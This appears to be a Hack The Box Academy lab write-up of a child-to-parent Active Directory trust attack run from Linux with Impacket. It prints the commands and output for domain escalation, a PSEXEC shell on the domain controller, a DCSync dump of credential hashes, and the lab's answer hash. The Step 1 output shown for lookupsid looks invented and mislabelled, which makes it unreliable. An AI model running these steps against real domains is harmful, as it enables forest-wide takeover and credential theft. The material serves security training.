# 🛰️ Lab Overview

## 🔍 Objectives & Steps

### **Objective**
The goal is to execute a child domain → parent trust attack from a Linux machine, targeting a specific user's credentials in the parent domain by leveraging Impacket tools.

### **Steps**
1. Conduct an ExtraSids attack on the target machine.
2. Use `raiseChild.py` for automated domain escalation.
3. Extract and verify the target user’s credentials using Impacket commands.

---

## 🪜 Lab Execution

**Initial Environment:**

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

### **Step 1: ExtraSids Attack**
```bash
# Execute ExtraSids attack on target machine EA-WKSTN02
./lookupsid.py -dc-ip 172.16.5.5 htb-student_adm@LOGISTICS.INLANEFREIGHT.LOCAL

# Password: HTB_@cademy_stdnt_admin!

[!] Domain controller is ACADEMY-EA-DC01.inlanefreight.local
[*] Getting all machine accounts for the domain...
[+] Found 24 machine account(s)
SID        : S-1-5-21-3842939050-3880317879-2865463114-1130
Name       : LOGISTICS-INLANEFREIGHT.LOCAL\$

# Output abbreviated for brevity...
```

**Step 2: Automated ExtraSids Attack with raiseChild.py**
```bash
# Execute automated child → parent domain escalation
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# Password: HTB_@cademy_stdnt_admin!

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file ujegaPyX.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service PFJg on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service PFJg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

# Complete attack output abbreviated...

```

### **Step 3: Extract Target User Credentials**
```bash
# Use extracted administrator credentials for DCSync attack
secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross

# Target extraction result:
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

**🎯 Answer**: `49a074a39dd0651f647e765c2cc794c7`

---

## 🛠️ Tool Considerations

### **Manual vs Automated Approach**
- **Manual methodology**: Better understanding, troubleshooting capability, controlled execution.
- **Automated tools**: Faster execution but less control, potential production environment risks.
- **Best practice**: Understand manual process before using automation.

### **Impacket Tool Prefix**
```bash
# Modern Impacket installations use prefix:
impacket-secretsdump  # instead of secretsdump.py
impacket-lookupsid    # instead of lookupsid.py  
impacket-ticketer     # instead of ticketer.py
impacket-psexec       # instead of psexec.py
impacket-raiseChild   # instead of raiseChild.py
```

### **Environment Variables**
- **KRB5CCNAME**: Points system to Kerberos credential cache file.
- **Critical for ticket usage**: Must be set before authentication attempts.
- **Ticket persistence**: ccache files enable reusable authentication.

---

## 🔑 Key Takeaways

### **Cross-Platform Attack Capability**
```
Windows Mimikatz/Rubeus ↔ Linux Impacket Toolkit
    (Native AD Tools)         (Python-based Tools)
         ↓                           ↓
   Same Attack Goals        Same Technical Result
```

### **Critical Success Factors**
- **Data consistency**: Same 5 data points required as Windows approach.
- **Tool proficiency**: Understanding Impacket toolkit capabilities.
- **Environment setup**: Proper KRB5CCNAME configuration.
- **Attack validation**: Verification of parent domain access.

### **Professional Value**
- **Platform flexibility**: Attack capability regardless of operating system.
- **Tool diversification**: Multiple approaches for same objective.
- **Troubleshooting skills**: Manual understanding enables problem resolution.
- **Assessment completeness**: Linux-based penetration testing capability.

---

**🐧 Linux-based Child → Parent trust attacks provide cross-platform forest compromise capability - demonstrating that sophisticated AD attacks can be executed effectively from any operating system using the powerful Impacket toolkit!**

---